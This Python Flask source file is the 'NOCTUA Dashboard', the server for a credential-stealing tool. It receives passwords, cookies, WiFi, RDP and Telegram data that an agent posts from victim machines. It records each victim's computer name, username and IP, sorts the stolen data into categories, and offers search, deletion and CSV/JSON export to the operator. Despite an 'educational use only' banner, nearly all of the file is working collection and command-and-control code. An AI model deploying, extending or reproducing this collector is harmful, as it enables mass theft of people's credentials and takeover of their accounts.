#!/usr/bin/env python3
"""
NOCTUA Dashboard - Flask web application for viewing captured credentials
Glassmorphism dark UI with real-time polling and management features
"""
import os
import sys
import json
import sqlite3
import datetime
import hashlib
import traceback
from pathlib import Path
from flask import Flask, request, jsonify, render_template, send_from_directory

# Database path
DB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
DB_PATH = os.path.join(DB_DIR, 'noctua.db')
os.makedirs(DB_DIR, exist_ok=True)

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload


# -------------------------------------------------------------------
# Database helpers
# -------------------------------------------------------------------
def get_db():
    """Get database connection with row factory."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db():
    """Initialize SQLite database schema."""
    conn = get_db()
    try:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                username TEXT NOT NULL DEFAULT '',
                password TEXT NOT NULL DEFAULT '',
                url TEXT NOT NULL DEFAULT '',
                notes TEXT NOT NULL DEFAULT '',
                computer_name TEXT NOT NULL DEFAULT '',
                machine_name TEXT NOT NULL DEFAULT '',
                collector_user TEXT NOT NULL DEFAULT '',
                timestamp TEXT NOT NULL DEFAULT (datetime('now')),
                source_ip TEXT NOT NULL DEFAULT '',
                collection_id TEXT NOT NULL DEFAULT '',
                category TEXT NOT NULL DEFAULT 'unknown',
                UNIQUE(collection_id, target, username, url)
            );
            
            CREATE INDEX IF NOT EXISTS idx_credentials_target 
                ON credentials(target);
            CREATE INDEX IF NOT EXISTS idx_credentials_timestamp 
                ON credentials(timestamp);
            CREATE INDEX IF NOT EXISTS idx_credentials_collection 
                ON credentials(collection_id);
                
            CREATE TABLE IF NOT EXISTS collections (
                id TEXT PRIMARY KEY,
                timestamp TEXT NOT NULL DEFAULT (datetime('now')),
                computer_name TEXT NOT NULL DEFAULT '',
                collector_user TEXT NOT NULL DEFAULT '',
                source_ip TEXT NOT NULL DEFAULT '',
                count INTEGER NOT NULL DEFAULT 0
            );
            
            CREATE TABLE IF NOT EXISTS config (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL DEFAULT ''
            );
        """)
        conn.commit()
    finally:
        conn.close()


def categorize_target(target):
    """Categorize credential by target name."""
    t = target.lower()
    if 'chrome' in t or 'edge' in t or 'brave' in t or 'opera' in t or 'vivaldi' in t:
        return 'browser'
    if 'wifi' in t:
        return 'wifi'
    if 'rdp' in t:
        return 'rdp'
    if 'telegram' in t:
        return 'telegram'
    if 'cookie' in t:
        return 'cookie'
    return 'other'


# -------------------------------------------------------------------
# Routes
# -------------------------------------------------------------------
@app.route('/')
def index():
    """Serve the dashboard UI."""
    return render_template('index.html')


@app.route('/api/data', methods=['GET'])
def get_data():
    """Get all credentials with optional filtering and pagination."""
    conn = get_db()
    try:
        # Parse query params
        search = request.args.get('search', '').strip()
        target = request.args.get('target', '').strip()
        category = request.args.get('category', '').strip()
        limit = request.args.get('limit', type=int, default=5000)
        offset = request.args.get('offset', type=int, default=0)
        sort_by = request.args.get('sort_by', 'timestamp')
        sort_order = request.args.get('sort_order', 'DESC')
        
        # Build query
        where_clauses = []
        params = []
        
        if search:
            where_clauses.append(
                "(username LIKE ? OR password LIKE ? OR url LIKE ? "
                "OR target LIKE ? OR notes LIKE ? OR computer_name LIKE ?)"
            )
            search_param = f"%{search}%"
            params.extend([search_param] * 6)
        
        if target:
            where_clauses.append("target = ?")
            params.append(target)
        
        if category:
            where_clauses.append("category = ?")
            params.append(category)
        
        where_sql = ""
        if where_clauses:
            where_sql = "WHERE " + " AND ".join(where_clauses)
        
        # Validate sort
        allowed_sorts = ['timestamp', 'target', 'username', 'computer_name', 'id']
        if sort_by not in allowed_sorts:
            sort_by = 'timestamp'
        if sort_order.upper() not in ['ASC', 'DESC']:
            sort_order = 'DESC'
        
        # Count total
        count_query = f"SELECT COUNT(*) as total FROM credentials {where_sql}"
        total = conn.execute(count_query, params).fetchone()['total']
        
        # Fetch data
        data_query = (
            f"SELECT * FROM credentials {where_sql} "
            f"ORDER BY {sort_by} {sort_order} "
            f"LIMIT ? OFFSET ?"
        )
        rows = conn.execute(data_query, params + [limit, offset]).fetchall()
        
        # Convert to dicts
        credentials = []
        for row in rows:
            credentials.append({
                'id': row['id'],
                'target': row['target'],
                'username': row['username'],
                'password': row['password'],
                'url': row['url'],
                'notes': row['notes'],
                'computer_name': row['computer_name'],
                'machine_name': row['machine_name'],
                'collector_user': row['collector_user'],
                'timestamp': row['timestamp'],
                'source_ip': row['source_ip'],
                'category': row['category'],
            })
        
        # Get stats
        stats = get_stats(conn)
        
        return jsonify({
            'success': True,
            'data': {
                'credentials': credentials,
                'total': total,
                'limit': limit,
                'offset': offset,
                'stats': stats
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
    finally:
        conn.close()


@app.route('/api/data', methods=['DELETE'])
def delete_data():
    """Delete credentials. Supports: all, by id, by target, by category."""
    conn = get_db()
    try:
        data = request.get_json(silent=True) or {}
        mode = data.get('mode', 'all')
        deleted = 0
        
        if mode == 'all':
            deleted = conn.execute("DELETE FROM credentials").rowcount
            conn.execute("DELETE FROM collections")
        elif mode == 'id':
            ids = data.get('ids', [])
            if ids:
                placeholders = ','.join(['?' for _ in ids])
                deleted = conn.execute(
                    f"DELETE FROM credentials WHERE id IN ({placeholders})",
                    ids
                ).rowcount
        elif mode == 'target':
            target = data.get('target', '')
            if target:
                deleted = conn.execute(
                    "DELETE FROM credentials WHERE target = ?", [target]
                ).rowcount
        elif mode == 'category':
            category = data.get('category', '')
            if category:
                deleted = conn.execute(
                    "DELETE FROM credentials WHERE category = ?", [category]
                ).rowcount
        
        conn.commit()
        return jsonify({
            'success': True,
            'deleted': deleted,
            'stats': get_stats(conn)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
    finally:
        conn.close()


@app.route('/api/collect', methods=['POST'])
def collect():
    """Receive credential data from the agent."""
    conn = get_db()
    try:
        # Parse JSON data
        data = request.get_json(silent=True)
        if not data:
            return jsonify({'success': False, 'error': 'Invalid JSON'}), 400
        
        credentials = data.get('credentials', [])
        if not credentials:
            return jsonify({'success': False, 'error': 'No credentials'}), 400
        
        # Metadata
        computer_name = data.get('computer_name', '')
        machine_name = data.get('machine_name', '')
        collector_user = data.get('username', '')
        source_ip = request.remote_addr or ''
        
        # Generate collection ID
        ts = datetime.datetime.utcnow().strftime('%Y%m%d%H%M%S')
        hash_input = f"{source_ip}{computer_name}{ts}"
        collection_id = hashlib.md5(hash_input.encode()).hexdigest()[:16]
        
        # Insert credentials
        inserted = 0
        for cred in credentials:
            target = cred.get('target', 'unknown')
            username = cred.get('username', '')
            password = cred.get('password', '')
            url = cred.get('url', '')
            notes = cred.get('notes', '')
            category = categorize_target(target)
            
            try:
                conn.execute("""
                    INSERT OR IGNORE INTO credentials 
                    (target, username, password, url, notes, 
                     computer_name, machine_name, collector_user,
                     timestamp, source_ip, collection_id, category)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 
                            datetime('now'), ?, ?, ?)
                """, [
                    target, username, password, url, notes,
                    computer_name, machine_name, collector_user,
                    source_ip, collection_id, category
                ])
                if conn.total_changes > 0:
                    inserted += 1
            except sqlite3.IntegrityError:
                pass
        
        # Record collection
        if inserted > 0:
            conn.execute("""
                INSERT OR REPLACE INTO collections
                (id, timestamp, computer_name, collector_user, source_ip, count)
                VALUES (?, datetime('now'), ?, ?, ?, ?)
            """, [collection_id, computer_name, collector_user, source_ip, inserted])
        
        conn.commit()
        
        return jsonify({
            'success': True,
            'inserted': inserted,
            'collection_id': collection_id,
            'total_credentials': conn.execute(
                "SELECT COUNT(*) as c FROM credentials"
            ).fetchone()['c']
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
    finally:
        conn.close()


@app.route('/api/config', methods=['GET', 'POST'])
def config():
    """Get or set configuration values."""
    conn = get_db()
    try:
        if request.method == 'GET':
            rows = conn.execute("SELECT key, value FROM config").fetchall()
            config_data = {row['key']: row['value'] for row in rows}
            return jsonify({'success': True, 'config': config_data})
        
        elif request.method == 'POST':
            data = request.get_json(silent=True)
            if not data:
                return jsonify({'success': False, 'error': 'Invalid JSON'}), 400
            
            for key, value in data.items():
                conn.execute(
                    "INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)",
                    [str(key), str(value)]
                )
            conn.commit()
            return jsonify({'success': True, 'message': 'Config updated'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
    finally:
        conn.close()


@app.route('/api/stats', methods=['GET'])
def stats():
    """Get statistics about stored credentials."""
    conn = get_db()
    try:
        stats_data = get_stats(conn)
        return jsonify({'success': True, 'stats': stats_data})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
    finally:
        conn.close()


@app.route('/api/export/<fmt>', methods=['GET'])
def export_data(fmt):
    """Export credentials in JSON or CSV format."""
    conn = get_db()
    try:
        search = request.args.get('search', '').strip()
        target = request.args.get('target', '').strip()
        
        # Build query
        where_clauses = []
        params = []
        
        if search:
            where_clauses.append(
                "(username LIKE ? OR password LIKE ? OR url LIKE ? "
                "OR target LIKE ? OR computer_name LIKE ?)"
            )
            s = f"%{search}%"
            params.extend([s] * 5)
        
        if target:
            where_clauses.append("target = ?")
            params.append(target)
        
        where_sql = ""
        if where_clauses:
            where_sql = "WHERE " + " AND ".join(where_clauses)
        
        rows = conn.execute(
            f"SELECT * FROM credentials {where_sql} ORDER BY timestamp DESC",
            params
        ).fetchall()
        
        if fmt == 'json':
            credentials = [dict(r) for r in rows]
            return jsonify({
                'exported_at': datetime.datetime.utcnow().isoformat(),
                'count': len(credentials),
                'credentials': credentials
            })
        
        elif fmt == 'csv':
            import csv
            import io
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow([
                'ID', 'Target', 'Username', 'Password', 'URL', 'Notes',
                'Computer', 'Machine', 'User', 'Timestamp', 'Source IP', 'Category'
            ])
            for row in rows:
                writer.writerow([
                    row['id'], row['target'], row['username'], row['password'],
                    row['url'], row['notes'], row['computer_name'],
                    row['machine_name'], row['collector_user'], row['timestamp'],
                    row['source_ip'], row['category']
                ])
            csv_data = output.getvalue()
            output.close()
            
            from flask import Response
            return Response(
                csv_data,
                mimetype='text/csv',
                headers={
                    'Content-Disposition': 'attachment; filename=noctua_export.csv'
                }
            )
        
        return jsonify({'success': False, 'error': f'Unsupported format: {fmt}'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
    finally:
        conn.close()


@app.route('/api/health', methods=['GET'])
def health():
    """Health check endpoint."""
    conn = get_db()
    try:
        count = conn.execute("SELECT COUNT(*) as c FROM credentials").fetchone()['c']
        return jsonify({
            'status': 'ok',
            'version': '1.0.0',
            'name': 'NOCTUA Dashboard',
            'total_credentials': count,
            'database': os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0
        })
    finally:
        conn.close()


# -------------------------------------------------------------------
# Helpers
# -------------------------------------------------------------------
def get_stats(conn=None):
    """Get credential statistics."""
    own_conn = False
    if conn is None:
        conn = get_db()
        own_conn = True
    
    try:
        total = conn.execute("SELECT COUNT(*) as c FROM credentials").fetchone()['c']
        
        # Category breakdown
        categories = conn.execute(
            "SELECT category, COUNT(*) as count FROM credentials "
            "GROUP BY category ORDER BY count DESC"
        ).fetchall()
        
        target_breakdown = conn.execute(
            "SELECT target, COUNT(*) as count FROM credentials "
            "GROUP BY target ORDER BY count DESC"
        ).fetchall()
        
        # Recent collections
        recent_collections = conn.execute(
            "SELECT * FROM collections ORDER BY timestamp DESC LIMIT 10"
        ).fetchall()
        
        # Unique computers
        computers = conn.execute(
            "SELECT DISTINCT computer_name FROM credentials "
            "WHERE computer_name != '' ORDER BY computer_name"
        ).fetchall()
        
        return {
            'total': total,
            'categories': {r['category']: r['count'] for r in categories},
            'targets': {r['target']: r['count'] for r in target_breakdown},
            'computers': [r['computer_name'] for r in computers],
            'collections': [dict(r) for r in recent_collections]
        }
    finally:
        if own_conn:
            conn.close()


# -------------------------------------------------------------------
# Error handlers
# -------------------------------------------------------------------
@app.errorhandler(404)
def not_found(e):
    return jsonify({'success': False, 'error': 'Not found'}), 404


@app.errorhandler(500)
def server_error(e):
    return jsonify({'success': False, 'error': 'Internal server error'}), 500


# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------
if __name__ == '__main__':
    init_db()
    banner = r"""
████████╗██╗  ██╗███████╗    ███╗   ██╗ ██████╗  ██████╗████████╗██╗   ██╗ █████╗ 
╚══██╔══╝██║  ██║██╔════╝    ████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗
   ██║   ███████║█████╗      ██╔██╗ ██║██║   ██║██║        ██║   ██║   ██║███████║
   ██║   ██╔══██║██╔══╝      ██║╚██╗██║██║   ██║██║        ██║   ██║   ██║██╔══██║
   ██║   ██║  ██║███████╗    ██║ ╚████║╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    """
    print(banner)
    print("  Copyright (c) 2025 Adam-ZS — https://github.com/Adam-ZS")
    print("  EDUCATIONAL USE ONLY — Authorized testing required.\n")
    print(f"[*] NOCTUA Dashboard starting...")
    print(f"[*] Database: {DB_PATH}")
    print(f"[*] Listen on http://0.0.0.0:5000")
    print(f"[*] Agent endpoint: POST /api/collect")
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        threaded=True
    )
